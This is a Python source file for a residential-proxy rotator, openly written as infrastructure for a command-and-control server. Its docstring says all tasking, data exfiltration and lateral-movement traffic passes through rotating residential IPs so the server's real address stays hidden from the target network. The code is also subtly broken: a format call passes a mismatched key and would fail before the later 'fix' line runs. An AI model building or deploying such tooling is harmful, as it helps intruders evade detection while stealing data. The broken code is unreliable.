# proxy_rotator.py — Rotates residential proxy pool per cycle
import requests
import secrets
from typing import Any, Dict, Optional

class ProxyRotator:
    """
    Manages residential proxy rotation. Supports Bright Data, Oxylabs, SmartProxy.
    Each rotation cycle generates a new session ID so the proxy provider
    assigns a fresh residential IP for egress.

    The C2 server on the Fly VM uses this proxy for ALL outbound traffic
    (tasking egress, data exfil, lateral movement) so the C2's real IP
    never touches the target network.
    """

    PROVIDERS = {
        "brightdata": {
            "endpoint": "brd.superproxy.io:22225",
            "auth_format": "{user}-session-{session}:{pass}"
        },
        "oxylabs": {
            "endpoint": "pr.oxylabs.io:7777",
            "auth_format": "{user}-session-{session}:{pass}"
        },
        "smartproxy": {
            "endpoint": "gate.smartproxy.com:7000",
            "auth_format": "{user}-session-{session}:{pass}"
        }
    }

    def __init__(self, provider: str, username: str, password: str, endpoint: Optional[str] = None):
        self.provider = provider
        self.user = username
        self.pwd = password
        self.endpoint = endpoint or self.PROVIDERS[provider]["endpoint"]

    def rotate_pool(self) -> Dict[str, Any]:
        """Generate a new proxy session with a fresh residential IP."""
        session_id = secrets.token_hex(8)
        auth = self.PROVIDERS[self.provider]["auth_format"].format(
            user=self.user,
            session=session_id,
            passw=self.pwd
        )
        # Fix: format string uses 'pass' which is reserved, use explicit
        auth = f"{self.user}-session-{session_id}:{self.pwd}"
        proxy_url = f"http://{auth}@{self.endpoint}"

        # Verify the proxy works before returning
        try:
            test = requests.get(
                "https://api.ipify.org?format=json",
                proxies={"http": proxy_url, "https": proxy_url},
                timeout=10
            )
            exit_ip = test.json().get("ip", "unknown") if test.ok else "unverified"
        except Exception:
            exit_ip = "unverified"

        return {
            "proxy_url": proxy_url,
            "proxy_auth": auth,
            "session_id": session_id,
            "exit_ip": exit_ip,
            "rotation_token": session_id  # passed to C2 server via env var
        }
